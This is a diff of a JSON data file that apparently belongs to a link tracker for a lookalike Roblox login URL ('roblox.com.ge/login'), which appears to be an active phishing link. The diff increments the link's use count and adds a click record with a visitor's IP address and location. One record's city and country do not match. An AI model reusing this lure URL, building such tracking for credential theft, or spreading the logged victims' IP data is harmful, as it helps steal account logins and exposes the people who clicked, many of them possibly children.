@@ -118,7 +118,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 905,
+    "useCount": 906,
     "createdBy": "admin",
     "clicks": [
       {
@@ -7360,6 +7360,14 @@
         "city": "Cuevas de San Marcos",
         "flag": "🇪🇸",
         "countryCode": "ES"
+      },
+      {
+        "timestamp": 1777197093667,
+        "ip": "84.145.39.66",
+        "country": "Germany",
+        "city": "Lubin",
+        "flag": "🇩🇪",
+        "countryCode": "DE"
       }
     ]
   },
